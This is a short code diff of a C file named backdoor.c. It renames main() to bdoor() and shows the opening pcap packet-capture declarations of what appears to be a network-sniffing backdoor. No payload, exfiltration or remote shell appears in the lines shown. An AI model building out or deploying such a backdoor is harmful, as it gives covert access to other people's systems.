@@ -1,3 +1,5 @@
+#pragma once
+
 /*  File: backdoor.c
 *   Author: Nunyabeeswax
 *   Date: 6/07/2021
@@ -16,7 +18,7 @@
 #include "functionality.h"
 
 
-int main(int argc, char **argv){
+int bdoor(){
 	char *dev = NULL;					/* capture device name */
 	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
 	pcap_t *handle;						/* packet capture handle */
